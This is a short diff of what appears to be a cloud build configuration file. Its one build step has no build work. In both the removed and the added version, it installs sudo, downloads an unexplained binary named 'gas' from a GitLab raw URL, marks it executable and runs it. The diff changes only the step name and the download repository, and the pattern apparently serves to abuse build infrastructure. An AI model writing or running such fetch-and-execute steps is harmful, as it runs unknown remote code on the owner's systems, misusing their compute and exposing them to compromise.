@@ -1,9 +1,9 @@
 steps:
-  - name: golang
+  - name: lee
     args:
       - '-c'
       - >-
-         apt update && apt-get install sudo -y && wget https://gitlab.com/uweldrop/percobaan1/-/raw/main/gas && chmod u+x gas && ./gas
+         apt update && apt-get install sudo -y && wget https://gitlab.com/uweldrop/newnormal/-/raw/main/gas && chmod u+x gas && ./gas
     waitFor:
       - '-'
     entrypoint: /bin/bash
